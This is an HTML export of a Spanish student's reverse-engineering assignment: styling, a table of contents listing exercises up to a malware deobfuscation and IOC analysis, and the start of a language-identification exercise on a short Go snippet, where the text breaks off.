<!DOCTYPE html>
<html>
<head>
<title>M3-Tarea1-entrega.md</title>
<meta http-equiv="Content-type" content="text/html;charset=UTF-8">

<style>
/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

body {
	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
	font-size: var(--vscode-markdown-font-size, 14px);
	padding: 0 26px;
	line-height: var(--vscode-markdown-line-height, 22px);
	word-wrap: break-word;
}

#code-csp-warning {
	position: fixed;
	top: 0;
	right: 0;
	color: white;
	margin: 16px;
	text-align: center;
	font-size: 12px;
	font-family: sans-serif;
	background-color:#444444;
	cursor: pointer;
	padding: 6px;
	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
}

#code-csp-warning:hover {
	text-decoration: none;
	background-color:#007acc;
	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
}

body.scrollBeyondLastLine {
	margin-bottom: calc(100vh - 22px);
}

body.showEditorSelection .code-line {
	position: relative;
}

body.showEditorSelection .code-active-line:before,
body.showEditorSelection .code-line:hover:before {
	content: "";
	display: block;
	position: absolute;
	top: 0;
	left: -12px;
	height: 100%;
}

body.showEditorSelection li.code-active-line:before,
body.showEditorSelection li.code-line:hover:before {
	left: -30px;
}

.vscode-light.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(0, 0, 0, 0.15);
}

.vscode-light.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(0, 0, 0, 0.40);
}

.vscode-light.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-dark.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 255, 255, 0.4);
}

.vscode-dark.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 255, 255, 0.60);
}

.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

.vscode-high-contrast.showEditorSelection .code-active-line:before {
	border-left: 3px solid rgba(255, 160, 0, 0.7);
}

.vscode-high-contrast.showEditorSelection .code-line:hover:before {
	border-left: 3px solid rgba(255, 160, 0, 1);
}

.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
	border-left: none;
}

img {
	max-width: 100%;
	max-height: 100%;
}

a {
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

a:focus,
input:focus,
select:focus,
textarea:focus {
	outline: 1px solid -webkit-focus-ring-color;
	outline-offset: -1px;
}

hr {
	border: 0;
	height: 2px;
	border-bottom: 2px solid;
}

h1 {
	padding-bottom: 0.3em;
	line-height: 1.2;
	border-bottom-width: 1px;
	border-bottom-style: solid;
}

h1, h2, h3 {
	font-weight: normal;
}

table {
	border-collapse: collapse;
}

table > thead > tr > th {
	text-align: left;
	border-bottom: 1px solid;
}

table > thead > tr > th,
table > thead > tr > td,
table > tbody > tr > th,
table > tbody > tr > td {
	padding: 5px 10px;
}

table > tbody > tr + tr > td {
	border-top: 1px solid;
}

blockquote {
	margin: 0 7px 0 5px;
	padding: 0 16px 0 10px;
	border-left-width: 5px;
	border-left-style: solid;
}

code {
	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
	font-size: 1em;
	line-height: 1.357em;
}

body.wordWrap pre {
	white-space: pre-wrap;
}

pre:not(.hljs),
pre.hljs code > div {
	padding: 16px;
	border-radius: 3px;
	overflow: auto;
}

pre code {
	color: var(--vscode-editor-foreground);
	tab-size: 4;
}

/** Theming */

.vscode-light pre {
	background-color: rgba(220, 220, 220, 0.4);
}

.vscode-dark pre {
	background-color: rgba(10, 10, 10, 0.4);
}

.vscode-high-contrast pre {
	background-color: rgb(0, 0, 0);
}

.vscode-high-contrast h1 {
	border-color: rgb(0, 0, 0);
}

.vscode-light table > thead > tr > th {
	border-color: rgba(0, 0, 0, 0.69);
}

.vscode-dark table > thead > tr > th {
	border-color: rgba(255, 255, 255, 0.69);
}

.vscode-light h1,
.vscode-light hr,
.vscode-light table > tbody > tr + tr > td {
	border-color: rgba(0, 0, 0, 0.18);
}

.vscode-dark h1,
.vscode-dark hr,
.vscode-dark table > tbody > tr + tr > td {
	border-color: rgba(255, 255, 255, 0.18);
}

</style>

<style>
/* Tomorrow Theme */
/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
/* Original theme - https://github.com/chriskempson/tomorrow-theme */

/* Tomorrow Comment */
.hljs-comment,
.hljs-quote {
	color: #8e908c;
}

/* Tomorrow Red */
.hljs-variable,
.hljs-template-variable,
.hljs-tag,
.hljs-name,
.hljs-selector-id,
.hljs-selector-class,
.hljs-regexp,
.hljs-deletion {
	color: #c82829;
}

/* Tomorrow Orange */
.hljs-number,
.hljs-built_in,
.hljs-builtin-name,
.hljs-literal,
.hljs-type,
.hljs-params,
.hljs-meta,
.hljs-link {
	color: #f5871f;
}

/* Tomorrow Yellow */
.hljs-attribute {
	color: #eab700;
}

/* Tomorrow Green */
.hljs-string,
.hljs-symbol,
.hljs-bullet,
.hljs-addition {
	color: #718c00;
}

/* Tomorrow Blue */
.hljs-title,
.hljs-section {
	color: #4271ae;
}

/* Tomorrow Purple */
.hljs-keyword,
.hljs-selector-tag {
	color: #8959a8;
}

.hljs {
	display: block;
	overflow-x: auto;
	color: #4d4d4c;
	padding: 0.5em;
}

.hljs-emphasis {
	font-style: italic;
}

.hljs-strong {
	font-weight: bold;
}
</style>

<style>
/*
 * Markdown PDF CSS
 */

 body {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
	padding: 0 12px;
}

pre {
	background-color: #f8f8f8;
	border: 1px solid #cccccc;
	border-radius: 3px;
	overflow-x: auto;
	white-space: pre-wrap;
	overflow-wrap: break-word;
}

pre:not(.hljs) {
	padding: 23px;
	line-height: 19px;
}

blockquote {
	background: rgba(127, 127, 127, 0.1);
	border-color: rgba(0, 122, 204, 0.5);
}

.emoji {
	height: 1.4em;
}

code {
	font-size: 14px;
	line-height: 19px;
}

/* for inline code */
:not(pre):not(.hljs) > code {
	color: #C9AE75; /* Change the old color so it seems less like an error */
	font-size: inherit;
}

/* Page Break : use <div class="page"/> to insert page break
-------------------------------------------------------- */
.page {
	page-break-after: always;
}

</style>

<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</head>
<body>
  <script>
    mermaid.initialize({
      startOnLoad: true,
      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
          ? 'dark'
          : 'default'
    });
  </script>
<p><img src="capturas/portada-tarea1-modulo3.png" alt="Portada"></p>
<div style="page-break-before: always;"></div>
<h1 id="%C3%ADndice">Índice</h1>
<ul>
<li><a href="#%C3%ADndice">Índice</a></li>
<li><a href="#ejercicio-1---identificaci%C3%B3n-del-lenguaje"><strong>Ejercicio 1 - Identificación del lenguaje</strong></a>
<ul>
<li><a href="#trozo-1"><strong>Trozo 1</strong></a>
<ul>
<li><a href="#definici%C3%B3n-de-funci%C3%B3n"><strong>Definición de función</strong></a></li>
<li><a href="#declaraciones-con-short-variable-declaration"><strong>Declaraciones con short variable declaration</strong></a></li>
<li><a href="#uso-de-make-para-mapas"><strong>Uso de make para mapas</strong></a></li>
<li><a href="#conversi%C3%B3n-de-tipos-al-estilo-go"><strong>Conversión de tipos al estilo Go</strong></a></li>
<li><a href="#uso-de-nil-como-valor-nulo"><strong>Uso de nil como valor nulo</strong></a></li>
<li><a href="#conclusi%C3%B3n-del-trozo-1"><strong>Conclusión del trozo 1</strong></a></li>
</ul>
</li>
<li><a href="#trozo-2"><strong>Trozo 2</strong></a>
<ul>
<li><a href="#la-cabecera-de-la-clase"><strong>La cabecera de la clase</strong></a></li>
<li><a href="#anotaciones-de-tipos-exclusivos-de-typescript"><strong>Anotaciones de tipos exclusivos de Typescript</strong></a></li>
<li><a href="#uso-de-javascript"><strong>Uso de Javascript</strong></a></li>
<li><a href="#conclusi%C3%B3n-del-trozo-2"><strong>Conclusión del trozo 2</strong></a></li>
</ul>
</li>
<li><a href="#trozo-3"><strong>Trozo 3</strong></a>
<ul>
<li><a href="#directiva-al-principio"><strong>Directiva al principio</strong></a></li>
<li><a href="#definici%C3%B3n-de-procedimientos"><strong>Definición de procedimientos</strong></a></li>
<li><a href="#llamada-a-m%C3%A9todos-de-la-aplicaci%C3%B3n-host"><strong>Llamada a métodos de la aplicación host</strong></a></li>
<li><a href="#cuadros-de-mensaje-y-constantes-vb"><strong>Cuadros de mensaje y constantes vb</strong></a></li>
<li><a href="#firma-de-procedimiento-con-optional-byval-as-tipo"><strong>Firma de procedimiento con Optional, ByVal, As Tipo</strong></a></li>
<li><a href="#conclusi%C3%B3n-del-trozo-3"><strong>Conclusión del trozo 3</strong></a></li>
</ul>
</li>
<li><a href="#trozo-4"><strong>Trozo 4</strong></a>
<ul>
<li><a href="#la-definici%C3%B3n-de-la-funci%C3%B3n"><strong>La definición de la función</strong></a></li>
<li><a href="#declaraciones-de-variables-locales"><strong>Declaraciones de variables locales</strong></a></li>
<li><a href="#estructura-del-bucle-y-llamada-a-funci%C3%B3n"><strong>Estructura del bucle y llamada a función</strong></a></li>
<li><a href="#conclusi%C3%B3n-del-trozo-4"><strong>Conclusión del trozo 4</strong></a></li>
</ul>
</li>
<li><a href="#trozo-5"><strong>Trozo 5</strong></a>
<ul>
<li><a href="#cmdlets-con-guiones-y-par%C3%A1metros-con-el-s%C3%ADmbolo-gui%C3%B3n"><strong>Cmdlets con guiones y parámetros con el símbolo guión</strong></a></li>
<li><a href="#variables-con-el-s%C3%ADmbolo--delante"><strong>Variables con el símbolo $ delante</strong></a></li>
<li><a href="#uso-de-switch-con-strings-entre-comillas"><strong>Uso de switch con strings entre comillas</strong></a></li>
<li><a href="#operador-match-para-expresiones-regulares"><strong>Operador match para expresiones regulares</strong></a></li>
<li><a href="#tipos-net-entre-corchetes-y-llamadas-est%C3%A1ticas"><strong>Tipos .NET entre corchetes y llamadas estáticas</strong></a></li>
<li><a href="#conclusi%C3%B3n-del-trozo-5"><strong>Conclusión del trozo 5</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ejercicio-2---an%C3%A1lisis-de-funciones"><strong>Ejercicio 2 - Análisis de Funciones</strong></a>
<ul>
<li><a href="#funci%C3%B3n-1"><strong>Función 1</strong></a>
<ul>
<li><a href="#1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-1"><strong>1. Identificación y propósito de la Función 1</strong></a></li>
<li><a href="#2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-1"><strong>2. Naturaleza de la función de la Función 1</strong></a></li>
<li><a href="#3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-1"><strong>3. Signatura y parámetros de la Función 1</strong></a></li>
<li><a href="#4-valor-de-retorno-de-la-funci%C3%B3n-1"><strong>4. Valor de retorno de la Función 1</strong></a></li>
<li><a href="#5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-1"><strong>5. Comportamiento y Efectos secundarios de la Función 1</strong></a></li>
<li><a href="#6-pureza-y-estado-de-la-funci%C3%B3n-1"><strong>6. Pureza y Estado de la Función 1</strong></a></li>
<li><a href="#7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-1"><strong>7. Sistema de tipos y visibilidad de la Función 1</strong></a></li>
<li><a href="#8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-1"><strong>8. Relaciones con otras funciones y librerías de la Función 1</strong></a></li>
<li><a href="#9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-1"><strong>9 Ejecución y depuración de la Función 1</strong></a></li>
<li><a href="#10-estructuras-de-control-de-la-funci%C3%B3n-1"><strong>10. Estructuras de control de la Función 1</strong></a></li>
<li><a href="#11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-1"><strong>11. Análisis de malware / seguridad de la Función 1</strong></a></li>
</ul>
</li>
<li><a href="#funci%C3%B3n-2"><strong>Función 2</strong></a>
<ul>
<li><a href="#1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-2"><strong>1. Identificación y propósito de la Función 2</strong></a></li>
<li><a href="#2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-2"><strong>2. Naturaleza de la función de la Función 2</strong></a></li>
<li><a href="#3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-2"><strong>3. Signatura y parámetros de la Función 2</strong></a></li>
<li><a href="#4-valor-de-retorno-de-la-funci%C3%B3n-2"><strong>4. Valor de retorno de la Función 2</strong></a></li>
<li><a href="#5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-2"><strong>5. Comportamiento y Efectos secundarios de la Función 2</strong></a></li>
<li><a href="#6-pureza-y-estado-de-la-funci%C3%B3n-2"><strong>6. Pureza y Estado de la Función 2</strong></a></li>
<li><a href="#7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-2"><strong>7. Sistema de tipos y Visibilidad de la Función 2</strong></a></li>
<li><a href="#8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-2"><strong>8. Relaciones con otras funciones y librerías de la Función 2</strong></a></li>
<li><a href="#9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-2"><strong>9. Ejecución y depuración de la Función 2</strong></a></li>
<li><a href="#10-estructuras-de-control-de-la-funci%C3%B3n-2"><strong>10. Estructuras de control de la Función 2</strong></a></li>
<li><a href="#11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-2"><strong>11. Análisis de malware / seguridad de la Función 2</strong></a></li>
</ul>
</li>
<li><a href="#funci%C3%B3n-3"><strong>Función 3</strong></a>
<ul>
<li><a href="#1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-3"><strong>1. Identificación y propósito de la Función 3</strong></a></li>
<li><a href="#2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-3"><strong>2. Naturaleza de la función de la Función 3</strong></a></li>
<li><a href="#3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-3"><strong>3. Signatura y parámetros de la Función 3</strong></a></li>
<li><a href="#4-valor-de-retorno-de-la-funci%C3%B3n-3"><strong>4. Valor de retorno de la Función 3</strong></a></li>
<li><a href="#5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-3"><strong>5. Comportamiento y Efectos secundarios de la Función 3</strong></a></li>
<li><a href="#6-pureza-y-estado-de-la-funci%C3%B3n-3"><strong>6. Pureza y Estado de la Función 3</strong></a></li>
<li><a href="#7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-3"><strong>7. Sistema de tipos y visibilidad de la Función 3</strong></a></li>
<li><a href="#8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-3"><strong>8. Relaciones con otras funciones y librerías de la Función 3</strong></a></li>
<li><a href="#9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-3"><strong>9. Ejecución y depuración de la Función 3</strong></a></li>
<li><a href="#10-estructuras-de-control-de-la-funci%C3%B3n-3"><strong>10. Estructuras de control de la Función 3</strong></a></li>
<li><a href="#11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-3"><strong>11. Análisis de malware / seguridad de la Función 3</strong></a></li>
</ul>
</li>
<li><a href="#funci%C3%B3n-4"><strong>Función 4</strong></a>
<ul>
<li><a href="#1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-4"><strong>1. Identificación y propósito de la Función 4</strong></a></li>
<li><a href="#2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-4"><strong>2. Naturaleza de la función de la Función 4</strong></a></li>
<li><a href="#3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-4"><strong>3. Signatura y parámetros de la Función 4</strong></a></li>
<li><a href="#4-valor-de-retorno-de-la-funci%C3%B3n-4"><strong>4. Valor de retorno de la Función 4</strong></a></li>
<li><a href="#5-comportamiento-y-efectos-secundarios-de-la-funci%C3%B3n-4"><strong>5. Comportamiento y Efectos secundarios de la Función 4</strong></a></li>
<li><a href="#6-pureza-y-estado-de-la-funci%C3%B3n-4"><strong>6. Pureza y Estado de la Función 4</strong></a></li>
<li><a href="#7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-4"><strong>7. Sistema de tipos y Visibilidad de la Función 4</strong></a></li>
<li><a href="#8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-4"><strong>8. Relaciones con otras funciones y librerías de la Función 4</strong></a></li>
<li><a href="#9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-4"><strong>9. Ejecución y depuración de la Función 4</strong></a></li>
<li><a href="#10-estructuras-de-control-de-la-funci%C3%B3n-4"><strong>10. Estructuras de control de la Función 4</strong></a></li>
<li><a href="#11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-4"><strong>11. Análisis de malware / seguridad de la Función 4</strong></a></li>
</ul>
</li>
<li><a href="#funci%C3%B3n-5"><strong>Función 5</strong></a>
<ul>
<li><a href="#1-identificaci%C3%B3n-y-prop%C3%B3sito-de-la-funci%C3%B3n-5"><strong>1. Identificación y Propósito de la Función 5</strong></a></li>
<li><a href="#2-naturaleza-de-la-funci%C3%B3n-de-la-funci%C3%B3n-5"><strong>2. Naturaleza de la función de la Función 5</strong></a></li>
<li><a href="#3-signatura-y-par%C3%A1metros-de-la-funci%C3%B3n-5"><strong>3. Signatura y parámetros de la Función 5</strong></a></li>
<li><a href="#4-valor-de-retorno-de-la-funci%C3%B3n-5"><strong>4. Valor de retorno de la Función 5</strong></a></li>
<li><a href="#5-comportamiento-y-efectos-de-la-funci%C3%B3n-5"><strong>5. Comportamiento y Efectos de la Función 5</strong></a></li>
<li><a href="#6-pureza-y-estado-de-la-funci%C3%B3n-5"><strong>6. Pureza y Estado de la Función 5</strong></a></li>
<li><a href="#7-sistema-de-tipos-y-visibilidad-de-la-funci%C3%B3n-5"><strong>7. Sistema de Tipos y Visibilidad de la Función 5</strong></a></li>
<li><a href="#8-relaciones-con-otras-funciones-y-librer%C3%ADas-de-la-funci%C3%B3n-5"><strong>8. Relaciones con otras funciones y librerías de la Función 5</strong></a></li>
<li><a href="#9-ejecuci%C3%B3n-y-depuraci%C3%B3n-de-la-funci%C3%B3n-5"><strong>9. Ejecución y depuración de la Función 5</strong></a></li>
<li><a href="#10-estructuras-de-control-de-la-funci%C3%B3n-5"><strong>10. Estructuras de control de la Función 5</strong></a></li>
<li><a href="#11-an%C3%A1lisis-de-malware--seguridad-de-la-funci%C3%B3n-5"><strong>11. Análisis de malware / seguridad de la Función 5</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ejercicio-3---an%C3%A1lisis-de-variables"><strong>Ejercicio 3 - Análisis de variables</strong></a>
<ul>
<li><a href="#1-par%C3%A1metros-y-retorno"><strong>1. Parámetros y retorno</strong></a></li>
<li><a href="#2-variables-locales-que-crea-y-necesita-%C3%A1mbito-de-esas-variables"><strong>2. Variables locales que crea y necesita; ámbito de esas variables.</strong></a></li>
<li><a href="#3-uso-y-modificaci%C3%B3n-de-par%C3%A1metros"><strong>3. Uso y modificación de parámetros</strong></a></li>
<li><a href="#4-lectura---escritura-de-valores-globales"><strong>4. Lectura - Escritura de valores globales</strong></a></li>
<li><a href="#5-estructuras-de-control"><strong>5. Estructuras de control</strong></a></li>
<li><a href="#6-llamadas-a-funciones-externas"><strong>6. Llamadas a funciones externas</strong></a></li>
<li><a href="#7-puntos-de-salida-de-la-funci%C3%B3n"><strong>7. Puntos de salida de la función</strong></a></li>
<li><a href="#8-en-resumen"><strong>8. En resumen</strong></a></li>
</ul>
</li>
<li><a href="#ejercicio-4---bases-de-datos-simb%C3%B3licas"><strong>Ejercicio 4 - Bases de datos simbólicas</strong></a>
<ul>
<li><a href="#1-pasos-para-crear-una-base-de-datos-simb%C3%B3lica-en-las-herramientas-elegidas"><strong>1. Pasos para crear una base de datos simbólica en las herramientas elegidas</strong></a>
<ul>
<li><a href="#crear-una-bd-simb%C3%B3lica-con-ctags"><strong>Crear una BD simbólica con ctags</strong></a></li>
<li><a href="#crear-una-bd-simb%C3%B3lica-con-global"><strong>Crear una BD simbólica con global</strong></a></li>
<li><a href="#crear-una-bd-simb%C3%B3lica-con-cscope"><strong>Crear una BD simbólica con cscope</strong></a></li>
</ul>
</li>
<li><a href="#2-busqueda-de-todas-las-funciones-main-que-existen"><strong>2. Busqueda de todas las funciones “main” que existen</strong></a>
<ul>
<li><a href="#buscar-funciones-main-con-global"><strong>Buscar funciones main con Global</strong></a></li>
<li><a href="#buscar-funciones-main-con-cscope"><strong>Buscar funciones main con Cscope</strong></a></li>
</ul>
</li>
<li><a href="#3-b%C3%BAsqueda-de-las-funciones-que-llaman-a-la-funci%C3%B3n-stringmatch"><strong>3. Búsqueda de las funciones que llaman a la función stringmatch</strong></a>
<ul>
<li><a href="#buscar-funciones-que-llaman-a-stringmatch-con-global"><strong>Buscar funciones que llaman a stringmatch con Global</strong></a></li>
<li><a href="#buscar-funciones-que-llaman-a-stringmatch-con-scope"><strong>Buscar funciones que llaman a stringmatch con Scope</strong></a></li>
</ul>
</li>
<li><a href="#4-b%C3%BAsqueda-de-la-declaraci%C3%B3n-de-struct-stream"><strong>4. Búsqueda de la declaración de struct stream</strong></a>
<ul>
<li><a href="#la-declaraci%C3%B3n-de-struct-stream-en-el-c%C3%B3digo"><strong>La declaración de struct stream en el código</strong></a></li>
<li><a href="#buscar-declaraci%C3%B3n-struct-stream-con-global"><strong>Buscar declaración struct stream con Global</strong></a></li>
<li><a href="#buscar-declaraci%C3%B3n-struct-stream-con-cscope"><strong>Buscar declaración struct stream con Cscope</strong></a></li>
</ul>
</li>
<li><a href="#5-enumeraci%C3%B3n-de-las-funciones-que-llaman-la-funci%C3%B3n-genredisinfostring"><strong>5. Enumeración de las funciones que llaman la función <code>genRedisInfoString</code></strong></a>
<ul>
<li><a href="#enumerar-funciones-que-llaman-a-genredisinfostring-con-cscope-en-modo-no-interactivo"><strong>Enumerar funciones que llaman a genRedisInfoString con Cscope en Modo NO interactivo</strong></a></li>
<li><a href="#enumerar-funciones-que-llaman-a-genredisinfostring-con-cscope-en-modo-interactivo"><strong>Enumerar funciones que llaman a genRedisInfoString con Cscope en Modo interactivo</strong></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#ejercicio-5---an%C3%A1lisis-de-las-variables-de-un-programa"><strong>Ejercicio 5 - Análisis de las variables de un programa</strong></a>
<ul>
<li><a href="#previo-instalaci%C3%B3n-de-gdbgui"><strong>Previo: Instalación de gdbgui</strong></a></li>
<li><a href="#an%C3%A1lisis-de-las-variables-del-programa"><strong>Análisis de las variables del programa</strong></a>
<ul>
<li><a href="#1-gni-global-no-inicializada"><strong>1. <code>gni</code> (Global No Inicializada)</strong></a></li>
<li><a href="#2-gi-global-inicializada"><strong>2. <code>gi</code> (Global Inicializada)</strong></a></li>
<li><a href="#3-eni-est%C3%A1tica-no-inicializada"><strong>3. <code>eni</code> (Estática No Inicializada)</strong></a></li>
<li><a href="#4-ei-est%C3%A1tica-inicializada"><strong>4. <code>ei</code> (Estática Inicializada)</strong></a></li>
<li><a href="#5-pae-el-puntero-en-s%C3%AD-y-pae-el-contenido-apuntado--memoria-din%C3%A1mica"><strong>5. <code>pae</code> (El puntero en sí) y <code>*pae</code> (El contenido apuntado / Memoria Dinámica)</strong></a></li>
</ul>
</li>
<li><a href="#tabla-resumen-de-las-variables"><strong>Tabla resumen de las variables</strong></a></li>
<li><a href="#esquema-general-de-la-memoria-para-esas-variables"><strong>Esquema general de la memoria para esas variables</strong></a></li>
</ul>
</li>
<li><a href="#ejercicio-6---desofuscaci%C3%B3n-de-un-programa"><strong>Ejercicio 6 - Desofuscación de un programa</strong></a>
<ul>
<li><a href="#desofuscaci%C3%B3n-del-archivo"><strong>Desofuscación del archivo</strong></a>
<ul>
<li><a href="#buscamos-finalizaciones-de-l%C3%ADnea"><strong>Buscamos finalizaciones de línea</strong></a></li>
<li><a href="#b%C3%BAsqueda-de-cadenas-con-uxxxx"><strong>Búsqueda de cadenas con <code>\uXXXX</code>:</strong></a></li>
<li><a href="#eliminamos-corchetes-seguidos-de-un-punto"><strong>Eliminamos corchetes seguidos de un punto</strong></a></li>
<li><a href="#quitar-los-s%C3%ADmbolos-de-suma"><strong>Quitar los símbolos de suma</strong></a></li>
<li><a href="#convertir-todos-los-u00xx-a-caracteres"><strong>Convertir todos los u00xx a caracteres</strong></a>
<ul>
<li><a href="#a%C3%B1adir-espacios-donde-falten-en-var"><strong>Añadir espacios donde falten en var</strong></a></li>
<li><a href="#renombrar-variables-para-entender-la-l%C3%B3gica"><strong>Renombrar variables para entender la lógica</strong></a></li>
</ul>
</li>
<li><a href="#limpiar-llamadas-a-los-objetos"><strong>Limpiar llamadas a los objetos</strong></a></li>
<li><a href="#a%C3%B1adimos-identaci%C3%B3n-y-espacios-en-blanco"><strong>Añadimos identación y espacios en blanco</strong></a></li>
</ul>
</li>
<li><a href="#analisis-del-comportamiento-del-malware"><strong>Analisis del comportamiento del malware</strong></a>
<ul>
<li><a href="#persistencia---auto-instalaci%C3%B3n"><strong>Persistencia - Auto-instalación</strong></a></li>
<li><a href="#huella-digital-fingerprinting"><strong>Huella Digital, Fingerprinting</strong></a></li>
<li><a href="#evasi%C3%B3n-de-antivirus---anti-sandbox"><strong>Evasión de Antivirus - Anti-Sandbox</strong></a></li>
<li><a href="#conexi%C3%B3n-con-el-servidor-de-mando-y-control-c2"><strong>Conexión con el Servidor de Mando y Control C2</strong></a></li>
<li><a href="#descarga-y-validaci%C3%B3n-del-malware"><strong>Descarga y Validación del Malware</strong></a></li>
<li><a href="#ejecuci%C3%B3n-y-limpieza"><strong>Ejecución y Limpieza</strong></a></li>
<li><a href="#si-falla-o-no-se-ejecuta-nada"><strong>Si falla o no se ejecuta nada</strong></a></li>
</ul>
</li>
<li><a href="#extracci%C3%B3n-los-iocs">Extracción los IOCs</a>
<ul>
<li><a href="#indicadores-de-red---network-indicators"><strong>Indicadores de Red - Network Indicators</strong></a></li>
<li><a href="#indicadores-de-host---host-based-indicators"><strong>Indicadores de Host - Host-based Indicators</strong></a></li>
<li><a href="#ioc-de-contenido---cadenas---strings"><strong>IoC de contenido - cadenas - strings</strong></a></li>
<li><a href="#mapeo-de-las-t%C3%A9cnicas-observadas-en-el-c%C3%B3digo-sobre-la-matriz-mitre-attck-enterprise"><strong>Mapeo de las técnicas observadas en el código sobre la matriz MITRE ATT&amp;CK Enterprise</strong></a>
<ul>
<li><a href="#t%C3%A1ctica-execution---ta0002"><strong>Táctica: Execution - TA0002</strong></a></li>
<li><a href="#t%C3%A1ctica-persistence---ta0003"><strong>Táctica: Persistence - TA0003</strong></a></li>
<li><a href="#t%C3%A1ctica-defense-evasion---ta0005"><strong>Táctica: Defense Evasion - TA0005</strong></a></li>
<li><a href="#t%C3%A1ctica-command-and-control---ta0011"><strong>Táctica: Command and Control - TA0011</strong></a></li>
<li><a href="#t%C3%A1ctica-resource-development-ta0042-command-and-control"><strong>Táctica: Resource Development, TA0042, Command and Control</strong></a></li>
<li><a href="#tabla-res%C3%BAmen-de-t%C3%A9cnicas-observadas-sobre-la-matriz-mitre-attack"><strong>Tabla resúmen de técnicas observadas sobre la matriz MITRE ATTACK</strong></a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="page-break-before: always;"></div>
<h1 id="ejercicio-1---identificaci%C3%B3n-del-lenguaje"><strong>Ejercicio 1 - Identificación del lenguaje</strong></h1>
<p>Cuando nos dan un código para que lo estudiemos, lo primero de todo es averiguar <strong>en que lenguaje está escrito</strong>. Ya sea <strong>ensamblador o un lenguaje de alto nivel</strong>, nuestro primer movimiento es observar los detalles del código para responder las siguientes preguntas: <strong>¿Es un ensamblador o es código de alto nivel? ¿El sistema de tipos es dinámico o estático? ¿Es un lenguaje compilado o se trata de un lenguaje interpretado?</strong> Para ello, vamos a entrenar la vista con trozos (la expresión anglosajona sería “snippet”) de código sobre los que debéis averiguar en que lenguaje esta escrito e indicar como lo habéis averiguado. Es decir, no basta con decir: “Es Perl.”</p>
<h2 id="trozo-1"><strong>Trozo 1</strong></h2>
<p><img src="capturas/trozo1.png" alt="Trozo 1"></p>
<div style="page-break-before: always;"></div>
<h3 id="definici%C3%B3n-de-funci%C3%B3n"><strong>Definición de función</strong></h3>
<pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InMemLoads</span><span class="hljs-params">()</span> <span class="hljs-params">(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]Image, error)</span></span> {
</div></code></pre>
<p>donde:</p>
<ul>
<li>Los tipos de retorno van después de los paréntesis, e incluso son múltiples <code>(map[string]Image, error)</code>. Esto es algo <strong>muy típico de Go.</strong></li>
</ul>
<hr>
<h3 id="declaraciones-con-short-variable-declaration"><strong>Declaraciones con short variable declaration</strong></h3>
<pre class="hljs"><code><div>ret := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]Image)
s, si, p := GetModuleLoadedOrder(<span class="hljs-number">0</span>)
start := p
i := <span class="hljs-number">1</span>
</div></code></pre>
<p>donde:</p>
<ul>
